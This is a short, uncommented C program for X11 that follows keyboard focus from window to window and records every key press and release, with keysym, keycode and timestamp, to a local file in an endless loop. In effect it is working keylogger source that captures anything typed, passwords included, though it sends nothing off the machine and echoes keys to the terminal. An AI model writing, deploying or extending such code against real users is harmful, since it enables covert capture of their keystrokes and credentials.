#include <X11/X.h>
#include <X11/Xlib.h>
#include <X11/Xutil.h>
#include <stdio.h>
#include <stdlib.h>


int main()
{
#ifdef DEBUG
	printf("Try to get env \"DISPLAY\"\n");
	printf("Result: %d\n", getenv("DISPLAY"));
#endif

	Display* d = XOpenDisplay(":0");
	if (d == NULL)
	{
		printf("Failed to create context.\n");
		return 1;
	}
	Window root = DefaultRootWindow(d);
	Window curFocus;
	char buf[17];
	KeySym ks;
	XComposeStatus comp;
	int len;
	int revert;

	XGetInputFocus(d, &curFocus, &revert);
	XSelectInput(d, curFocus, KeyPressMask | KeyReleaseMask | FocusChangeMask);

	FILE *f = fopen("file.txt", "w");
	if (f == NULL)
	{
		printf("Error opening file!\n");
		return 1;
	}
	

	while (1)
	{
		XEvent ev;
		XNextEvent(d, &ev);
		switch (ev.type)
		{
		case FocusOut:
			if (curFocus != root)
				XSelectInput(d, curFocus, 0);
			XGetInputFocus(d, &curFocus, &revert);
			if (curFocus == PointerRoot)
				curFocus = root;
			XSelectInput(d, curFocus, KeyPressMask | KeyReleaseMask | FocusChangeMask);
			break;

		case KeyPress:
			
			len = XLookupString(&ev.xkey, buf, 16, &ks, &comp);
			printf("Key: %d, xkey: %d\n", (int)ks, ev.xkey.keycode);
			fprintf(f, "%d;%d;%d\n", (int)ks, (int)ev.xkey.keycode, (int)ev.xkey.time);
			break;
		case KeyRelease:
			fprintf(f, "%d;%d;%d\n", (int)ks, (int)ev.xkey.keycode, (int)ev.xkey.time);
			break;
		}
	}
	fclose(f);
}